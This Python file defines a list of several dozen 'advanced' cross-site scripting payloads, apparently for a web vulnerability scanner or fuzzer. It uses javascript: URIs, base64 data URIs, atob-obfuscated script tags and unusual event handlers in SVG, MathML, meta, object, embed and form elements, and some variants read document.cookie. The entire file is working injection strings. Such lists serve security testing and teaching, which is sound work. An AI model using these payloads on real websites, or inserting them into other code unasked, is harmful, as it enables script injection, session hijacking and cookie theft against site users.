"""
Advanced XSS payloads
"""

ADVANCED_PAYLOADS = [
    # JavaScript protocol payloads
    'javascript:alert(1)',
    'javascript:alert("XSS")',
    'javascript:alert(document.cookie)',

    # Data URI payloads
    # <script>alert(1)</script>
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    # <script>alert("XSS")</script>
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=',
    # <script>alert(document.cookie)</script>
    'data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+',

    # Event handler payloads
    'onload=alert(1)',
    'onload=alert("XSS")',
    'onload=alert(document.cookie)',

    # Obfuscated script tag payloads
    '<script>eval(atob("YWxlcnQoMSk="))</script>',  # alert(1)
    '<script>eval(atob("YWxlcnQoIlhTUyIp"))</script>',  # alert("XSS")
    # alert(document.cookie)
    '<script>eval(atob("YWxlcnQoZG9jdW1lbnQuY29va2llKQ=="))</script>',

    # Script tag with src attribute payloads
    '<script src="data:text/javascript,alert(1)"></script>',
    '<script src="data:text/javascript,alert(\'XSS\')"></script>',
    '<script src="data:text/javascript,alert(document.cookie)"></script>',

    # Exotic event handlers
    '<div onwheel=alert(1)>Scroll me</div>',
    '<div ondrag=alert(1)>Drag me</div>',
    '<div onkeydown=alert(1)>Press any key</div>',

    # CSS-based payloads
    '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>',
    '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(\'XSS\')"></div>',
    '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(document.cookie)"></div>',

    # Meta tag payloads
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'XSS\')">',
    '<meta http-equiv="refresh" content="0;url=javascript:alert(document.cookie)">',

    # SVG animation payloads
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s></animate></svg>',
    '<svg><animate onbegin=alert("XSS") attributeName=x dur=1s></animate></svg>',
    '<svg><animate onbegin=alert(document.cookie) attributeName=x dur=1s></animate></svg>',

    # Script tag with different event handlers
    '<script onload=alert(1)></script>',
    '<script onload=alert("XSS")></script>',
    '<script onload=alert(document.cookie)></script>',

    # Exotic attributes
    '<div contextmenu=xss><menu type=context id=xss onshow=alert(1)></menu></div>',
    '<div contextmenu=xss><menu type=context id=xss onshow=alert("XSS")></menu></div>',
    '<div contextmenu=xss><menu type=context id=xss onshow=alert(document.cookie)></menu></div>',

    # Form-based payloads
    '<form><button formaction=javascript:alert(1)>Click me</button></form>',
    '<form><button formaction=javascript:alert("XSS")>Click me</button></form>',
    '<form><button formaction=javascript:alert(document.cookie)>Click me</button></form>',

    # Object tag payloads
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4="></object>',
    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+"></object>',

    # Embed tag payloads
    '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></embed>',
    '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4="></embed>',
    '<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+"></embed>',

    # Math ML payloads
    '<math><maction actiontype="statusline#" xlink:href="javascript:alert(1)">Click me</maction></math>',
    '<math><maction actiontype="statusline#" xlink:href="javascript:alert(\'XSS\')">Click me</maction></math>',
    '<math><maction actiontype="statusline#" xlink:href="javascript:alert(document.cookie)">Click me</maction></math>',
]
